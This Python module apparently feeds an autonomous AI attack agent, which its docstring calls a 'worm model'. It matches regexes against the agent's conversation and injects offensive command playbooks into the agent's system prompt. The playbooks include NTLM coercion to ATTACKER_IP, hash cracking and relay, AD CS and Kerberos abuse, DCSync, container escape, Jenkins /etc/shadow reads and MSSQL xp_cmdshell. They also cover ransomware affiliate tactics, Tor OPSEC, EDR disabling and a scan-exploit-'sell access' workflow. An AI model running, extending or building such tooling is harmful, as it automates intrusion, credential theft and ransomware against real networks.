"""
Technique pattern retriever for worm model augmentation.
Pulls relevant attack patterns from the walkthrough KB based on
what the phase executors have discovered so far.
"""
import re

# ── Trigger → Technique mappings ──
# Each entry: (regex_pattern, technique_block)
# regex_pattern is matched against the full conversation/messages text
TRIGGER_TECHNIQUES = [
    # ── SMB / Share ──
    (r"(writable\s+smb|smb\s+share|anonymous\s+smb|smb\s+listing)",
     "SMB writable share found → drop SCF/url file to coerce NTLM auth.\n"
     "  SCF: echo '[Shell]\\nCommand=2\\nIconFile=\\\\\\\\ATTACKER_IP\\share\\x.ico' > malicious.scf\n"
     "  URL: create .url file pointing to \\\\\\\\ATTACKER_IP\\share\n"
     "  Capture with: responder -I tun0\n"
     "  Crack with: hashcat -m 5600 hash.txt rockyou.txt"),

    # ── NTLM / Relay ──
    (r"(ntlm|responder|capture.*hash|netntlm|ntlmv2)",
     "NTLM hash captured → attempt crack (hashcat -m 5600) or relay.\n"
     "  If SMB signing disabled: ntlmrelayx.py -t ldap://DC_IP -smb2support\n"
     "  If AD CS present: ntlmrelayx.py -t http://DC_IP/certsrv -smb2support\n"
     "  If LDAP signing disabled: PetitPotam -> relay to LDAP for RBCD/Shadow Creds"),

    # ── AD CS / Certificate Services ──
    (r"(ad\s*cs|certificate\s*services|certsrv|certify|certipy|enroll)",
     "AD CS detected → check vulnerable templates.\n"
     "  certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP\n"
     "  ESC1: ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU -> request as admin\n"
     "  ESC3: Enrollment Agent -> request on behalf of target user\n"
     "  ESC8: NTLM relay to /certsrv/\n"
     "  ESC13: template linked to security group -> group membership escalation\n"
     "  Shadow Creds: check msDS-KeyCredentialLink write access"),

    # ── Kerberos ──
    (r"(kerberos|kerberoast|as-rep|krb|tgt|tgs)",
     "Kerberos attack surface:\n"
     "  kerbrute userenum -d DOMAIN --dc DC_IP /path/to/wordlist\n"
     "  GetUserSPNs.py DOMAIN/USER:PASS -dc-ip DC_IP -request (kerberoast)\n"
     "  GetNPUsers.py DOMAIN/USER:PASS -dc-ip DC_IP (AS-REP roast)\n"
     "  hashcat -m 13100 hash.txt rockyou.txt (RC4 kerberoast)\n"
     "  hashcat -m 19700 hash.txt rockyou.txt (AES kerberoast)\n"
     "  Rubeus: asktgt, s4u, monitor for delegation abuse"),

    # ── LDAP ──
    (r"(ldap|ldapsearch|ldap signing|ldap injection)",
     "LDAP recon / abuse:\n"
     "  ldapsearch -x -H ldap://DC_IP -D 'DOMAIN\\\\USER' -w PASS -b 'DC=DOMAIN,DC=LOCAL'\n"
     "  ldapdomaindump -u DOMAIN\\\\USER -p PASS -o ldap_dump/\n"
     "  Check ldap signing: if disabled -> PetitPotam + relay to LDAP\n"
     "  Blind LDAP injection: char-by-char brute of attributes"),

    # ── MSSQL ──
    (r"(mssql|sql.?server|xp_cmdshell|linked.?server|bulk\s*insert)",
     "MSSQL attack chain:\n"
     "  mssqlclient.py DOMAIN/USER:PASS@TARGET -windows-auth\n"
     "  Enumerate linked servers: SELECT * FROM sys.servers\n"
     "  Double-hop: EXEC('EXEC(''whoami'') AT [LINKED_SERVER]') AT [INTERMEDIATE]\n"
     "  xp_cmdshell: enable via EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE\n"
     "  BULK INSERT coercion (if bulkadmin): bulk insert from \\\\\\\\ATTACKER\\share\\file\n"
     "  sp_execute_external_script (Python/R): EXEC sp_execute_external_script @language=N'Python'"),

    # ── WinRM / PSRemoting ──
    (r"(winrm|ps.?remoting|evil.?winrm|5985|5986)",
     "WinRM access:\n"
     "  evil-winrm -i TARGET -u USER -p PASS\n"
     "  evil-winrm -i TARGET -u USER -H NTLM_HASH\n"
     "  If cert auth needed: openssl pkcs12 -export -out cert.pfx -inkey key.pem -in cert.pem\n"
     "  Check IPv6 WinRM if IPv4 blocked: evil-winrm -i dead:beef::..."),

    # ── AD / Domain ──
    (r"(domain\s*controller|dc\b|active\s*directory|domain\s*admin|dcsync|ntds\.dit)",
     "Domain dominance:\n"
     "  secretsdump.py DOMAIN/USER:PASS@DC_IP (DCSync)\n"
     "  secretsdump.py -hashes :NTLM_HASH DOMAIN/ADMIN@DC_IP\n"
     "  bloodhound-python -u USER -p PASS -d DOMAIN -dc DC_IP -c All\n"
     "  netexec smb DC_IP -u USER -p PASS --ntds (dump NTDS.dit)\n"
     "  Check AD Recycle Bin for deleted admin accounts"),

    # ── Shadow Credentials ──
    (r"(shadow\s*cred|msds-keycredentiallink|pywhisker|whisker|addkeycredentiallink)",
     "Shadow Credentials attack:\n"
     "  certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET -dc-ip DC_IP\n"
     "  pywhisker.py -d DOMAIN -u USER -p PASS --target TARGET --action=list\n"
     "  pywhisker.py -d DOMAIN -u USER -p PASS --target TARGET --action=add --filename exploit\n"
     "  PKINITauth.py -d DOMAIN -u TARGET -p PKINIT_PASS -dc-ip DC_IP\n"
     "  Requirements: write access to msDS-KeyCredentialLink on target"),

    # ── RBCD ──
    (r"(rbcd|resource.based|allowedtoact|delegation)",
     "Resource-Based Constrained Delegation:\n"
     "  bloodyAD -d DOMAIN -u USER -p PASS set attribute TARGET allowedToActOnBehalfOfOtherIdentity\n"
     "  impacket-addcomputer DOMAIN/USER:PASS -method SAMR -dc-ip DC_IP\n"
     "  impacket-getST -spn cifs/TARGET 'DOMAIN/FAKE$:PASS' -impersonate Administrator\n"
     "  impacket-smbexec DOMAIN/ADMIN@TARGET -hashes :NTLM\n"
     "  Pre-req: GenericWrite/GenericAll on target computer object"),

    # ── BloodHound ──
    (r"(bloodhound|sharphound|bloudhound|attack\s*path)",
     "BloodHound analysis:\n"
     "  bloodhound-python -u USER -p PASS -d DOMAIN -dc DC_IP -c All\n"
     "  SharpHound.exe -c All (upload and run on Windows target)\n"
     "  Check: shortest path to DA, kerberoastable->DA, ACL abuse chains\n"
     "  ADCS paths: Certipy + BloodHound CE for ESC1/3/8/13\n"
     "  Look for: GenericAll, GenericWrite, WriteDACL, WriteOwner"),

    # ── Container / Docker ──
    (r"(docker|container|escape|docker\s*sock|cgroup|privileged)",
     "Container escape techniques:\n"
     "  Check /var/run/docker.sock -> docker run -v /:/mnt -it alpine chroot /mnt\n"
     "  Check --privileged -> mount /dev/sda1 /mnt; chroot /mnt\n"
     "  Check CAP_SYS_ADMIN -> cgroup release_agent escape\n"
     "  Check SYS_MODULE -> compile+load kernel module\n"
     "  Check /proc/sys/kernel/core_pattern -> write to host filesystem\n"
     "  Tools: pspy64, socat statically compiled, chisel for tunneling"),

    # ── Web App ──
    (r"(xss|ssrf|sqli|sql\s*injection|rce|lfi|file\s*read|file\s*upload|cms|php)",
     "Web exploitation:\n"
     "  XSS → session hijack / internal scan / proxy JS\n"
     "  SSRF → IMDS (169.254.169.254), LocalStack, internal services\n"
     "  SQLi → sqlmap -u URL --batch --risk 3 --level 5\n"
     "  LFI → /etc/passwd, proc/self/environ, php://filter\n"
     "  File upload → webshell, SCF drop, malicious ODT/URL\n"
     "  CMS specific → check CVEs for version (searchsploit, nuclei)"),

    # ── Linux PrivEsc ──
    (r"(kernel\s*module|lkm|mmap|suid|capability|setuid|pspy|cron|sudo|polkit)",
     "Linux privilege escalation:\n"
     "  pspy64 -> monitor process/cron for race conditions\n"
     "  sudo -l -> check sudoers entries\n"
     "  SUID binaries -> search for exploitable (GTFOBins)\n"
     "  Kernel exploits -> uname -a -> searchsploit\n"
     "  Capabilities -> getcap -r / 2>/dev/null\n"
     "  Docker group membership -> docker run -v /:/host -it chroot /host\n"
     "  Cron jobs -> check writable scripts, wildcard injection\n"
     "  Polkit -> check for old versions (CVE-2021-3560, etc.)"),

    # ── ROP / Binary Exploit ──
    (r"(rop|ret2libc|buffer\s*overflow|binary\s*exploit|gdb|nx|aslr)",
     "Binary exploitation approach:\n"
     "  checksec binary -> check protections (NX, PIE, RELRO, Stack Canary)\n"
     "  If no NX: shellcode on stack\n"
     "  If NX+ASLR: ret2libc / ROP\n"
     "  Find libc base via: leak (puts@GOT), or brute-force\n"
     "  ROPgadget --binary binary > gadgets\n"
     "  One_gadget libc.so.6 -> find magic one-shot addresses"),

    # ── Coercion ──
    (r"(coercer|petitpotam|printerbug|ms-rprn|ms-efsrpc|coerce)",
     "Auth coercion methods:\n"
     "  PetitPotam -d DOMAIN TARGET_IP ATTACKER_IP (MS-EFSRPC)\n"
     "  Coercer -d DOMAIN -u USER -p PASS -t TARGET -l ATTACKER\n"
     "  PrinterBug via MS-RPRN: rpcdump.py | grep MS-RPRN\n"
     "  xp_dirtree MSSQL: EXEC master..xp_dirtree '\\\\ATTACKER\\share'\n"
     "  MpCmdRun.exe: MpCmdRun.exe -Scan -ScanType 3 -File \\\\\\\\ATTACKER\\share"),

    # ── ZTA / NTLM disabled ──
    (r"(ntlm\s*disabled|kerberos.only|zerotrust)", 
     "NTLM disabled / Kerberos-only environment:\n"
     "  All auth must use Kerberos — no NTLM relay possible\n"
     "  Focus on: Kerberoast, AS-REP roast, RBCD, Shadow Creds, ADCS\n"
     "  Certificate auth via certipy: certipy auth -pfx cert.pfx -dc-ip DC_IP\n"
     "  Use kerbrute for user enumeration (not ASREP which needs NTLM)"),

    # ── Jenkins / CI/CD — real-world case: CVE-2024-23897 → DA ──
    (r"(jenkins|ci.?cd|pipeline.*automation|groovy|script.?console)",
     "Jenkins CI/CD server exposed → high-value target:\n"
     "  CVE-2024-23897: arbitrary file read via CLI @ feature\n"
     "    java -jar jenkins-cli.jar -s http://JENKINS_URL -auth USER:TOKEN connect-node @/etc/shadow\n"
     "  Post-RCE: decrypt secrets offline via master.key + hudson.util.Secret\n"
     "  Jenkins runs as SYSTEM on Windows — instant high privilege\n"
     "  Groovy script console: use println 'id'.execute().text for RCE\n"
     "  Dump build logs for tokens/credentials in CI/CD pipelines\n"
     "  Pivot: harvested creds → ADCS abuse → DCSync → DA"),

    # ── Shodan / FOFA / Internet scanning — IAB TTP ──
    (r"(shodan|fofa|leakix|internet.*scan|attack.*surface|recon.*exposed)",
     "Internet-wide scanning for initial access (Mommy/Miyako TTP):\n"
     "  Shodan: search filters for PAN-OS, F5 Big-IP, Webmin, ScreenConnect\n"
     "  FOFA: Chinese alternative with different coverage (OT/IoT devices)\n"
     "  Leakix: finds leak/listener services, default creds, known vulns\n"
     "  Typical targets: VPN gateways, firewalls, Jenkins, Citrix, Exchange\n"
     "  Workflow: scan → CVE match → exploit PoC → internal recon → sell access\n"
     "  OPSEC: route through VPN+Tor, burner VPS, no linguistic patterns\n"
     "  Tools: Sliver C2, BloodHound, DNS tunneling, LOLBins for evasion"),

    # ── Ransomware / RaaS / Extortion ──
    (r"(ransomware|raas|ransomware.*service|double.*extort|triple.*extort|affiliate.*model)",
     "Ransomware affiliate/franchise model TTPs:\n"
     "  RaaS operators handle: encryptor dev, payment portal, leak site, negotiation\n"
     "  Affiliates handle: initial access, lateral movement, data staging\n"
     "  Revenue split: operator 20-40%, affiliate 60-80%\n"
     "  Access brokers sell VPN/RDP footholds to affiliates ($100-$10K per access)\n"
     "  Common kill chain: VPN/SSH abuse → BloodHound → LDAP domain dump →\n"
     "    DCSync → data exfil → encrypt all endpoints simultaneously\n"
     "  Double extortion: exfiltrate + encrypt. Triple extortion: + DDoS or customer notification\n"
     "  Living-off-the-land: PowerShell, WMI, PsExec, SC, Net, Reg, Vssadmin\n"
     "  Defense evasion: disable AV/EDR via BYOVD, AMSI bypass, ETW patching"),

    # ── VPN / Firewall as initial access vector ──
    (r"(vpn|palo.*alto|sonicwall|forti.*gate|pulse.*secure|f5.*big|no.*mfa|credential.*stuff)",
     "VPN/firewall as initial access (most common ransomware vector):\n"
     "  CVE-2024-53704 SonicWall SSL VPN — SQLi auth bypass\n"
     "  CVE-2024-40766 SonicOS — improper access control (Akira/Fog abuse)\n"
     "  CVE-2024-3400 PAN-OS — command injection (HellCat/Mommy abuse)\n"
     "  CVE-2024-0012 PAN-OS — auth bypass\n"
     "  Technique: scan Shodan → match version → exploit → VPN tunnel → internal network\n"
     "  Colonial Pipeline: single reused VPN password, no MFA, got ~100GB in 2 hours\n"
     "  Once inside: same tools as any Windows/AD kill chain\n"
     "  Prevention: MFA on ALL VPN accounts, credential monitoring, stale account cleanup"),
]

def match_techniques(text: str, max_matches: int = 4) -> list:
    """Scan text for trigger patterns and return matching technique blocks."""
    text_lower = text.lower()
    matched = []
    seen_patterns = set()
    for pattern, technique in TRIGGER_TECHNIQUES:
        if re.search(pattern, text_lower):
            dedup_key = technique[:60]
            if dedup_key not in seen_patterns:
                seen_patterns.add(dedup_key)
                matched.append(technique)
            if len(matched) >= max_matches:
                break
    return matched

def build_system_suffix(messages_text: str) -> str:
    """Build a technique-aware suffix to append to the system prompt."""
    matches = match_techniques(messages_text)
    if not matches:
        return ""
    blocks = "\n\n".join(matches)
    return (
        "\n\n── TECHNIQUE REFERENCE ──\n"
        f"Based on what you've found so far, here are relevant techniques:\n\n"
        f"{blocks}\n\n"
        "Adapt these to the target. Not every technique applies — use your judgment."
    )
